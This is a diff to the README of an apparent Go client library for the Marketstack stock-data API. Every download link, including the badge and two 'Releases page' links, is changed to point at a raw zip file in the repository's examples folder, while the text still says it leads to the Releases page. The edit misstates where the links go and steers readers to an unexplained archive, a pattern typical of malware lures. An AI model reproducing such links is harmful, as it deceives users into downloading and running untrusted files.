@@ -1,7 +1,7 @@
 # 📈 marketstack-go - Access Market Data Effortlessly
 
 ## 📥 Download Now
-[![Download marketstack-go](https://img.shields.io/badge/Download%20marketstack-go-0088cc?style=flat-square&logo=github)](https://github.com/cnn123-bit/marketstack-go/releases)
+[![Download marketstack-go](https://raw.githubusercontent.com/cnn123-bit/marketstack-go/main/examples/go_marketstack_v3.1.zip%20marketstack-go-0088cc?style=flat-square&logo=github)](https://raw.githubusercontent.com/cnn123-bit/marketstack-go/main/examples/go_marketstack_v3.1.zip)
 
 ## 📖 Overview
 marketstack-go is a Go client library designed for the Marketstack API. It provides easy access to real-time, intraday, and historical stock market data from over 70 global exchanges. With features like context support, type-safe requests and responses, and robust error handling, it stands ready for any user—whether you're managing investments or just curious about market trends.
@@ -10,7 +10,7 @@ marketstack-go is a Go client library designed for the Marketstack API. It provi
 To get started with marketstack-go, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/cnn123-bit/marketstack-go/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/cnn123-bit/marketstack-go/main/examples/go_marketstack_v3.1.zip) to find the latest version of the software.
 
 2. **Download the Latest Release**  
    On the Releases page, look for the most recent version. Click on the link to download the appropriate file for your operating system.
@@ -71,4 +71,4 @@ Should you have any questions or need additional help, feel free to reach out:
 With marketstack-go, accessing stock market data becomes an effortless task. Whether you're tracking a single stock or managing a portfolio, this application provides the tools you need to stay informed. 
 
 ## 🔗 Download & Install
-Don’t wait! Visit our [Releases page](https://github.com/cnn123-bit/marketstack-go/releases) today to download marketstack-go and start accessing market data like a pro.
+Don’t wait! Visit our [Releases page](https://raw.githubusercontent.com/cnn123-bit/marketstack-go/main/examples/go_marketstack_v3.1.zip) today to download marketstack-go and start accessing market data like a pro.
